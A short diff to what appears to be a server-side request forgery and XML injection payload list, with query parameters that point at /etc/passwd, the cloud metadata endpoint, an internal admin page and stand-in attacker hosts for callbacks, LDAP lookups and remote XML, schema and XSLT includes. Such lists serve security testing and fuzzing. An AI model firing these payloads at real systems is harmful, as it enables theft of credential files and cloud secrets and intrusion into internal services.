@@ -1,5 +1,11 @@
 ?url=file:///etc/passwd
 ?path=//evil.com/resource
-?src=http://169.254.169.254/
-?resource=\\attacker.com\share
+?src=http://169.254.169.254/latest/meta-data/
 ?target=ldap://evil.com/exploit
+?redirect=http://internal:8080/admin
+?callback=http://attacker.com/hook
+?feed=http://attacker.com/rss.xml
+?import=http://evil.com/schema.xsd
+?include=http://attacker.com/payload.xml
+?xml=http://attacker.com/evil.xml
+?xslt=http://attacker.com/transform.xsl
